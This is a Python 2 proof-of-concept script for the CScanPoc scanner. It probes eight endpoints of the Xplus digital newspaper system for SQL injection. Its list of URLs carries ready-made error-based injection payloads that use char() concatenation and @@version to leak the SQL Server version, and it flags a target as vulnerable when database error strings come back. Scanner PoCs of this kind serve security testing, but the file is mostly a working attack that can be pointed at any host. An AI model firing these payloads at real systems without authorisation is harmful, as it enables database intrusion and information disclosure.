# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '80b85372-1278-4d59-ab51-83026b6fd834'
    name = 'Xplus数字报纸通用型get注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        喜阅传媒（Xplus）新数通盛世科技数字报纸多处通用型注入漏洞：
        /www/index.php?mod=admin&con=subscribe&act=unsubscribe&subsId=1&userId=1
        /www/index.php?mod=index&con=index&act=img1&papername=
        /www/index.php?mod=admin&con=deliver&title=1
        /www/index.php?mod=admin&con=review&act=view&id=123456
        /www/index.php?mod=admin&con=review&content=1
        /www/index.php?mod=admin&con=user&realName=
        /www/index.php?mod=admin&con=Subscribe&act=unsubscribeList&reason=1
        /www/index.php?mod=index&con=Review&act=gettitle&aid=1
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=151537
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Xplus'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '73c3ec52-4279-4340-bac9-681881721a9c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = ["/www/index.php?mod=admin&con=subscribe&act=unsubscribe&subsId=1&userId=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&papers_cn=aaaaaaaa&papers_en=xxxxxxxx" ,# userId参数存在报错注入
                '/www/index.php?mod=index&con=index&act=img1&papername=\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--',
                '/www/index.php?mod=admin&con=deliver&title=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&content=&phone=&haveImage=&adopt=&startDate=&endDate=&submit=+%CB%D1+%CB%F7+ ' ,
                '/www/index.php?mod=admin&con=review&act=view&id=123456\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--', # id参数存在注入
                '/www/index.php?mod=admin&con=review&content=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--', # content参数存在注入
                '/www/index.php?mod=admin&con=user&realName=\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' ,   # realName参数存在注入
                '/www/index.php?mod=admin&con=Subscribe&act=unsubscribeList&reason=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' ,  #reson参数存在注入
                '/www/index.php?mod=index&con=Review&act=gettitle&aid=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' #aid参数存在注入
                ]
            for p in ps:
                url = arg + p
                #print url
                code2, head, res, errcode, _ = hh.http(url )
            # print res
                if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()